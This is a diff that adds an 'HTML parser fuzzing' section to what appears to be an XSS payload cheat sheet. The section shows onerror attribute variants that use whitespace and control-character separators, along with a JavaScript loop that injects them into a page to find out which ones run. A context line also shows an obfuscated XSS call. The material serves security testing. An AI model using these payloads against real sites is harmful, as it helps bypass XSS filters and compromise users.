@@ -85,6 +85,26 @@ self[Object.keys(self)[5]]("XSS")
 </body>
 ```
 
+### HTML parser fuzzing
+
+```html
+<img src=x onerrorFUZZ="alert()" />
+=> FUZZ: 9, 10, 12, 13, 32 (respectively \t, \n, \0xC, \r, space)
+```
+
+{{< details "HTML parser fuzzing" >}}
+```js
+var i = 0;
+function fuzz() {
+    console.log("Testing " + i + "...");
+    document.body.innerHTML = `<img src=x onerror${String.fromCharCode(i)}="alert(${i})" />`;
+    i += 1;
+    setTimeout(fuzz, 500);
+}
+fuzz();
+```
+{{< /details >}}
+
 ### Anchors fuzzing
 
 #### Javascript protocol
